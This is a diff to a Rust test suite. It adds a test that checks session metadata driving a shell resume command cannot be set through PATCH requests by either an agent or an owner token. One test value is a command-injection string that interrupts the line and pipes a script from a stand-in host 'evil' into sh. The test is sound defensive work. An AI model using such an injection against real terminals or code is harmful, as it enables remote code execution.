@@ -623,3 +623,29 @@ async fn only_session_credentials_drive_and_only_their_owners_windows() {
     assert_eq!(out["code"], "no_ui_client", "{out}");
     assert!(!gets(&mut bobs, "ui_command", Duration::from_millis(300)).await);
 }
+
+/// S1-12: `meta.nested_*` drives the line Otto TYPES into a shell's PTY on
+/// resume (`cd <nested_cwd> && claude --resume …`). No PATCH may set it —
+/// not the session's agent token, not the owner's own token.
+#[tokio::test]
+async fn nested_resume_meta_is_server_owned() {
+    let d = boot().await;
+    for (who, token) in [("agent", &d.agent), ("owner", &d.human)] {
+        for meta in [
+            json!({"nested_cwd": "x\u{3}curl evil|sh #"}),
+            json!({"nested_provider": "claude"}),
+            json!({"nested_pid": 1}),
+        ] {
+            assert_eq!(
+                d.patch(
+                    token,
+                    &format!("/sessions/{}", d.sid),
+                    json!({ "meta": meta })
+                )
+                .await,
+                403,
+                "{who} PATCHed {meta}"
+            );
+        }
+    }
+}
